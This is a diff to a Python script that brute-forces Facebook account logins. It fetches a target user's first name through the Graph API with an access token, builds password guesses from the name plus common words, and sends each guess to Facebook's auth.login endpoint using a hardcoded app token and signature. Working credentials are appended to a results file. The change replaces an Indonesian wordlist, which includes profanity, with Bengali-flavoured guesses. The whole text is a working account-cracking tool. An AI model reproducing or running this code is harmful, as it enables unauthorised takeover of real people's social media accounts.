@@ -114,8 +114,8 @@ def x(user):
 	except:
 		pass
 	try:
-		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["last_name"]
-		for pas in [nama+"123","@"+nama,nama+"1234",nama+"12345",nama+".com",nama+".01","ANJING","KONTOL","@"+nama+"01","BANGSAT","SAYANG","ngentot","ngacengan","santuy"]:
+		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
+		for pas in [nama+"123",nama+"880",nama+"12345",nama+"90",nama+".01","slamalikum","amar naam","Krud'dha","Kukurēra chēlē","Kukura","Mahārgha","Camatkāra",nama+"01","@"+nama]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
